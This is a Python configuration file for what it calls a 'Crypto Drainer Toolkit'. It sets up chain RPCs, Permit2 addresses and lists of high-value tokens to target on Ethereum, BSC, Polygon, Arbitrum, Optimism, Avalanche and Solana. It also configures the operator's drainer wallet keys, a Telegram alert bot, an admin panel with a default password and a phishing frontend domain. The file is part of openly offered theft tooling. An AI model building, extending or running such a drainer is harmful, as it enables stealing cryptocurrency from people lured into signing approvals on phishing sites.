#!/usr/bin/env python3
"""
Configuration for the Crypto Drainer Toolkit.
Loads sensitive values from .env file.
"""
import os
from pathlib import Path
from dotenv import load_dotenv

# Load environment variables from .env file
env_path = Path(__file__).resolve().parent.parent / ".env"
load_dotenv(env_path)

# Sepolia RPC override for environments with private or key-based providers
SEPOLIA_RPC = os.getenv("SEPOLIA_RPC", "https://rpc.sepolia.org")

# ============================================================
# NETWORK CONFIGURATION
# ============================================================
CHAIN_CONFIG = {
    # ── EVM CHAINS ───────────────────────────────────────────
    "ethereum": {
        "chain_type": "evm",
        "chain_id": 1,
        "rpc": "https://eth.drpc.org",
        "explorer": "https://etherscan.io",
        "currency": "ETH",
        "permit2_address": "0x000000000022D473030F116dDEE9F6B43aC78BA3",
        "high_value_tokens": [
            "0xdAC17F958D2ee523a2206206994597C13D831ec7",  # USDT
            "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48",  # USDC
            "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2",  # WETH
            "0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599",  # WBTC
            "0x7D1AfA7B718fb893dB30A3aBc0Cfc608AaCfeBB0",  # MATIC (Polygon bridged)
            "0x514910771AF9Ca656af840dff83E8264EcF986CA",  # LINK
            "0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984",  # UNI
        ]
    },
    "sepolia": {
        "chain_type": "evm",
        "chain_id": 11155111,
        "rpc": SEPOLIA_RPC,
        "explorer": "https://sepolia.etherscan.io",
        "currency": "ETH",
        "permit2_address": "0x000000000022D473030F116dDEE9F6B43aC78BA3",
        "high_value_tokens": []
    },
    "bsc": {
        "chain_type": "evm",
        "chain_id": 56,
        "rpc": "https://bsc-dataseed.binance.org",
        "explorer": "https://bscscan.com",
        "currency": "BNB",
        "permit2_address": "0x000000000022D473030F116dDEE9F6B43aC78BA3",
        "high_value_tokens": [
            "0x55d398326f99059fF775485246999027B3197955",  # USDT (BSC)
            "0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d",  # USDC (BSC)
            "0x2170Ed0880ac9A755fd29B2688956BD959F933F8",  # WETH (BSC)
            "0x7130d2A12B9BCbFAe4f2634d864A1Ee1Ce3Ead9c",  # BTCB
            "0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c",  # WBNB
            "0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82",  # CAKE
        ]
    },
    "polygon": {
        "chain_type": "evm",
        "chain_id": 137,
        "rpc": "https://polygon-rpc.com",
        "explorer": "https://polygonscan.com",
        "currency": "MATIC",
        "permit2_address": "0x000000000022D473030F116dDEE9F6B43aC78BA3",
        "high_value_tokens": [
            "0xc2132D05D31c914a87C6611C10748AEb04B58e8F",  # USDT (Polygon)
            "0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174",  # USDC (Polygon)
            "0x7ceB23fD6bC0adD59E62ac25578270cFf1b9f619",  # WETH (Polygon)
            "0x0d500B1d8E8eF31E21C99d1Db9A6444d3ADf1270",  # WMATIC
        ]
    },
    "arbitrum": {
        "chain_type": "evm",
        "chain_id": 42161,
        "rpc": "https://arb1.arbitrum.io/rpc",
        "explorer": "https://arbiscan.io",
        "currency": "ETH",
        "permit2_address": "0x000000000022D473030F116dDEE9F6B43aC78BA3",
        "high_value_tokens": [
            "0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9",  # USDT (Arbitrum)
            "0xaf88d065e77c8cC2239327C5EDb3A432268e5831",  # USDC (Arbitrum)
            "0x82aF49447D8a07e3bd95BD0d56f35241523fBab1",  # WETH (Arbitrum)
            "0x2f2a2543B76A4166549F7aaB2e75Bef0aefC5B0f",  # WBTC (Arbitrum)
        ]
    },
    "optimism": {
        "chain_type": "evm",
        "chain_id": 10,
        "rpc": "https://mainnet.optimism.io",
        "explorer": "https://optimistic.etherscan.io",
        "currency": "ETH",
        "permit2_address": "0x000000000022D473030F116dDEE9F6B43aC78BA3",
        "high_value_tokens": [
            "0x94b008aA00579c1307B0EF2c499aD98a8ce58e58",  # USDT (Optimism)
            "0x0b2C639c533813f4Aa9D7837CAf62653d097Ff85",  # USDC (Optimism)
            "0x4200000000000000000000000000000000000006",  # WETH (Optimism)
            "0x68f180fcCe6836688e9084f035309E29Bf0A2095",  # WBTC (Optimism)
        ]
    },
    "avalanche": {
        "chain_type": "evm",
        "chain_id": 43114,
        "rpc": "https://api.avax.network/ext/bc/C/rpc",
        "explorer": "https://snowtrace.io",
        "currency": "AVAX",
        "permit2_address": "0x000000000022D473030F116dDEE9F6B43aC78BA3",
        "high_value_tokens": [
            "0x9702230A8Ea53601f5cD2dc00fDBc13d4dF4A8c7",  # USDT (Avalanche)
            "0xB97EF9Ef8734C71904D8002F8b6Bc66Dd9c48a6E",  # USDC (Avalanche)
            "0x49D5c2BdFfac6CE2BFdB6640F4F80f226bc10bAB",  # WETH (Avalanche)
            "0x50b7545627a5162F82A992c33b87aDc75187B218",  # WBTC (Avalanche)
        ]
    },

    # ── SOLANA (NON-EVM) ─────────────────────────────────────
    "solana": {
        "chain_type": "solana",
        "chain_id": 101,  # Solana mainnet-beta cluster ID
        "rpc": "https://api.mainnet-beta.solana.com",
        "rpc_wss": "wss://api.mainnet-beta.solana.com",
        "explorer": "https://solscan.io",
        "currency": "SOL",
        "decimals": 9,
        # High-value SPL token mint addresses
        "high_value_tokens": {
            "SOL": "So11111111111111111111111111111111111111112",        # Native SOL (wrapped)
            "USDC": "EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v",   # USD Coin
            "USDT": "Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB",   # Tether
            "RAY":  "4k3Dyjzvzp8eMZWUXbBCjEvwSkkk59S5iCNLY3QrkX6R",   # Raydium
            "SRM":  "SRMuApVNdxXokk5GT7XD5cUUgXMBCoAz2LHeuAoKWRt",     # Serum
            "JUP":  "JUPyiwrYJFskUPiHa7hkeR8VUtAeFoSYbKedZNsDvCN",     # Jupiter
            "BONK": "DezXAZ8z7PnrnRJjz3wXBoRgixCa6xjnB7YaB1pPB263",   # Bonk
            "WIF":  "EKpQGSJtjMFqKZ9KQanSqYXRcF8fBopzLHYxdM65zcjm",   # dogwifhat
            "PYTH": "HZ1JovNiVvGrGNiiYvEozEVgZ58xaU3RKwX8eACQBCt3",   # Pyth Network
            "JTO":  "jtojtomepa8beP8AuQc6eXt5FriJwfFMwQx2v2f9mCL",    # Jito
        },
        # DEX program IDs for checking LP positions
        "dex_programs": {
            "raydium_amm": "675kPX9MHTjS2zt1qfr1NYHuzeLXfQM9H24wFSUt1Mp8",
            "raydium_clmm": "CAMMCzo5YL8w4VFF8KVHrK22GGUsp5VTaW7grrKgrWqK",
            "jupiter_aggregator": "JUP6LkbZbjS1jKKwapdHX74JKafrcQQMTqpMMm1nYb7",
            "orca_whirlpools": "whirLbMiicVdio4qvUfM5KAg6Ct8VwpYzGff3uctyCc",
            "meteora_dlmm": "LBUZKhRxPF3XUpBCjp4YzTKgLccjZh656DM3bbcF5fE",
        }
    },
}

# ============================================================
# DEFAULT CHAIN
# ============================================================
DEFAULT_CHAIN = os.getenv("DEFAULT_CHAIN", "ethereum")

# ============================================================
# YOUR WALLET — FROM .ENV
# ============================================================
YOUR_PRIVATE_KEY = os.getenv("DRAINER_PRIVATE_KEY", "")
YOUR_WALLET_ADDRESS = os.getenv("DRAINER_WALLET", "")

# Solana-specific: your Solana wallet's base58 private key
SOLANA_PRIVATE_KEY = os.getenv("SOLANA_PRIVATE_KEY", "")
SOLANA_WALLET_ADDRESS = os.getenv("SOLANA_WALLET_ADDRESS", "")

# ============================================================
# TELEGRAM BOT — FROM .ENV
# ============================================================
TELEGRAM_BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN", "")
TELEGRAM_CHAT_ID = os.getenv("TELEGRAM_CHAT_ID", "")

# ============================================================
# FLASK ADMIN PANEL — FROM .ENV
# ============================================================
FLASK_SECRET_KEY = os.getenv("FLASK_SECRET_KEY", "change-this-to-random-string-in-production")
FLASK_HOST = os.getenv("FLASK_HOST", "0.0.0.0")
FLASK_PORT = int(os.getenv("FLASK_PORT", "5000"))
FLASK_DEBUG = os.getenv("FLASK_DEBUG", "false").lower() == "true"
ADMIN_PASSWORD = os.getenv("ADMIN_PASSWORD", "drainer_admin_2025")

# ============================================================
# PHISHING FRONTEND — FROM .ENV
# ============================================================
PHISHING_DOMAIN = os.getenv("PHISHING_DOMAIN", "localhost")
USE_SSL = os.getenv("USE_SSL", "false").lower() == "true"

# ============================================================
# MONITORING — FROM .ENV
# ============================================================
MONITOR_INTERVAL_SECONDS = int(os.getenv("MONITOR_INTERVAL_SECONDS", "30"))
BLOCK_CONFIRMATIONS = int(os.getenv("BLOCK_CONFIRMATIONS", "1"))
MAX_GAS_PRICE_GWEI = int(os.getenv("MAX_GAS_PRICE_GWEI", "200"))
GAS_MULTIPLIER = float(os.getenv("GAS_MULTIPLIER", "1.2"))

# ============================================================
# FILE PATHS
# ============================================================
BASE_DIR = Path(__file__).resolve().parent.parent
CONTRACTS_DIR = BASE_DIR / "contracts" / "compiled"
LOG_FILE = BASE_DIR / "logs" / "drainer.log"
os.makedirs(BASE_DIR / "logs", exist_ok=True)


# ============================================================
# HELPERS
# ============================================================

def normalize_private_key(raw_key):
    """Normalize and validate a private key string."""
    if not raw_key:
        raise ValueError("Private key is not set.")
    if raw_key.startswith("0x"):
        raw_key = raw_key[2:]
    if len(raw_key) != 64:
        raise ValueError("Private key must be 64 hex characters.")
    try:
        int(raw_key, 16)
    except ValueError:
        raise ValueError("Private key contains invalid hex characters.")
    return "0x" + raw_key


# ============================================================
# HELPER: Get chain config
# ============================================================
def get_chain_config(chain_name=None):
    """Get config for a specific chain, or the default."""
    if chain_name is None:
        chain_name = DEFAULT_CHAIN
    return CHAIN_CONFIG.get(chain_name)


def is_evm_chain(chain_name):
    """Check if a chain is EVM-based."""
    config = get_chain_config(chain_name)
    return config and config.get("chain_type") == "evm"


def is_solana_chain(chain_name):
    """Check if a chain is Solana."""
    config = get_chain_config(chain_name)
    return config and config.get("chain_type") == "solana"